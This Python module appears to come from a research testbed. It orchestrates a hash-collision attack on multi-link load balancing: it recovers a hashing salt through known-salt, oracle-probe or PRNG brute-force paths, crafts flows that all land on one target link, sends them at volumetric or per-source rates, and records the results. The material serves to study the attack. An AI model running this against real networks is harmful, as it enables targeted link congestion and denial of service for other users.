"""AC-1-4 orchestrator: resolve salt -> craft the collision set -> send ->
emit the run-record P4/P5 consume (frozen interface, epic s4)."""
from __future__ import annotations

from typing import Any

from testbed.config import (
    BRUTEFORCE_DRAW_WINDOW,
    N_LINKS,
    PRECISION_PER_SOURCE_PPS,
    PRNG_SEED_SPACE_BITS,
    VOLUMETRIC_PPS,
)
from testbed.types import FiveTuple

from .collision import CollisionCrafter
from .knowledge import KnowledgeLevel, resolve_salt
from .oracle import PlacementOracle
from .traffic import TrafficMode, random_five_tuples, send_flows


def run_attack(
    level: KnowledgeLevel,
    mode: TrafficMode,
    target_link: int,
    *,
    dst_ip: str,
    salt_source_kind: str = "prng",
    known_salt: bytes | None = None,
    oracle: PlacementOracle | None = None,
    probes: list[FiveTuple] | None = None,
    seed_space_bits: int = PRNG_SEED_SPACE_BITS,
    draw_window: int = BRUTEFORCE_DRAW_WINDOW,
    count: int,
    proto: int = 6,
    src_ip_pool: list[str] | None = None,
    src_port_range: range = range(1024, 65535),
    dst_port: int = 80,
    rate_pps: int = VOLUMETRIC_PPS,
    per_source_cap: int = PRECISION_PER_SOURCE_PPS,
    iface: str,
    n_links: int = N_LINKS,
) -> dict[str, Any]:
    """Run one attack: resolve the salt for `level`, craft (or fall back to
    random, for blind) `count` flows targeting `target_link`, send them in
    `mode`, and return the structured run-record."""
    reconstruction = resolve_salt(
        level,
        known_salt=known_salt,
        oracle=oracle,
        probes=probes,
        seed_space_bits=seed_space_bits,
        draw_window=draw_window,
        n_links=n_links,
    )

    if reconstruction.salt is not None:
        crafter = CollisionCrafter(salt=reconstruction.salt, target_link=target_link, n_links=n_links)
        five_tuples = crafter.craft(
            count,
            dst_ip=dst_ip,
            proto=proto,
            src_ip_pool=src_ip_pool or [dst_ip.rsplit(".", 1)[0] + ".1"],
            src_port_range=src_port_range,
            dst_port=dst_port,
        )
        salt_source_note = f"{level}:{salt_source_kind}"
    else:
        five_tuples = random_five_tuples(count, dst_ip=dst_ip, proto=proto)
        salt_source_note = f"{level}:none"

    if mode == "volumetric" and five_tuples:
        five_tuples = [five_tuples[0]] * count

    flows_sent = send_flows(
        five_tuples,
        mode=mode,
        rate_pps=rate_pps,
        per_source_cap=per_source_cap,
        iface=iface,
    )

    sources_used = sorted({ft.src_ip for ft in five_tuples})

    return {
        "level": level,
        "mode": mode,
        "target_link": target_link,
        "salt_source": salt_source_note,
        "sources_used": sources_used,
        "flows_sent": flows_sent,
        "reconstruction": {
            "attempts": reconstruction.attempts,
            "elapsed_seconds": reconstruction.elapsed_seconds,
        },
    }
